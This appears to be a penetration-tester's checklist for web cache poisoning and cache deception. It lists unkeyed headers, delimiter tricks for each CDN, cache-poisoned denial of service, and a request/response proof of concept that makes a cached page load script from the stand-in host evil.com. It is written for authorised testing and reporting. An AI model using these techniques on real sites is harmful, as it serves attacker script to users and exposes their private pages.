# Web Cache Poisoning & Deception

## Cache poisoning
**What it is:** Get a harmful response cached and served to other users via an unkeyed input.

- [ ] Find unkeyed inputs: headers reflected in response but not in the cache key (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Forwarded-For`, custom).
- [ ] Poison with `X-Forwarded-Host: evil.com` → cached page loads attacker resources / redirects.
- [ ] Cache-key normalization gaps: `?` , `//`, case, port, encoded chars.
- [ ] Poison to store XSS/redirect/DoS response under a popular URL.
- [ ] Fat GET, param cloaking, `Vary` misconfig.
- [ ] Confirm the poisoned response is served to a fresh client (age/cache headers).

## Cache deception
**What it is:** Trick the cache into storing a victim's authenticated page as if static.

- [ ] Append `/nonexistent.css` / `;.jpg` / `%0Aa.css` to a private page → cache stores it → attacker fetches the cached private content.

## Tools
Burp **Param Miner** (unkeyed header discovery), manual.

## Impact
Mass XSS/redirect (poisoning), theft of other users' private pages (deception).

## 🎯 PoC — Request → Response (unkeyed header poison)

Poison with a cache-buster so real users are untouched while testing:
```http
GET /?cb=838 HTTP/2
Host: target.com
X-Forwarded-Host: evil.com
```
```http
HTTP/2 200 OK
X-Cache: miss
Cache-Control: public, max-age=300

...<script src="https://evil.com/static/app.js"></script>...   ← reflected + cached
```
Clean request (no header) now serves the poisoned copy:
```http
GET /?cb=838 HTTP/2
Host: target.com
```
```http
HTTP/2 200 OK
X-Cache: hit           ← served from cache to a different client
...<script src="https://evil.com/static/app.js"></script>...
```

## Deep cuts — unkeyed inputs, delimiters, and CPDoS
- [ ] **Unkeyed-input hunt (Param Miner "guess headers/params"):** `X-Forwarded-Host/-Scheme/-Proto/-Port/-Server`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For`, `X-HTTP-Method-Override`, `Accept-Language`, `User-Agent`, `Origin` (→ poison CORS `ACAO`), plus hidden query params — anything reflected but not in the cache key.
- [ ] **Cache-key normalization / injection:** the key drops the query, or normalizes `//`, `%2f`, case, port, `;`, trailing `?` differently than the app → collide a victim URL with your poisoned variant. `Vary` too narrow/absent = broader poisoning.
- [ ] **Fat GET / body-in-GET:** cache keys the URL but the origin reads a GET body/param → poison with an unkeyed body.
- [ ] **Poison something valuable:** cached **redirect** (`Location` from `X-Forwarded-Host`), cached **CORS** `ACAO: evil.com`, cached **CSP** removal, cached **XSS** reflection, cached **cookie**/CSRF-token swap (`05-client-side/02`, `06`).
- [ ] **CPDoS (cache-poisoned DoS):** oversized/malformed header, `X-HTTP-Method-Override: POST`, or a meta-char that makes the origin 400/500 → the error gets cached and served to everyone.
- [ ] **Cache-deception delimiter matrix (per CDN):** `/account.css`, `/account/foo.css`, `/account;.css`, `/account%2f.css`, `/account%0a.css`, `/account%23.css`, `/account?.css`, path-parameter `;name=x` — different CDNs treat `.`, `;`, `%2f`, `%00`, `//` as the static-file boundary. Confirm the private page got cached (age/`X-Cache: hit`) from a *fresh* client.
- [ ] **Internal cache vs edge:** Varnish/nginx `proxy_cache`/Cloudflare/Fastly/Akamai each key differently — fingerprint (`x-cache`, `age`, `via`) and target the one with the gap (`10-server-edge/03`).
- [ ] **Scope safety:** always poison behind a `?cb=<random>` while testing so real users aren't affected; prove impact with a second fresh client hitting the same key.

## Report notes
Show the poisoned/deceptive response served to a different client than the one that cached it. Use benign payloads; a self-only cache is not impactful. Name the unkeyed input / delimiter and the cache layer.
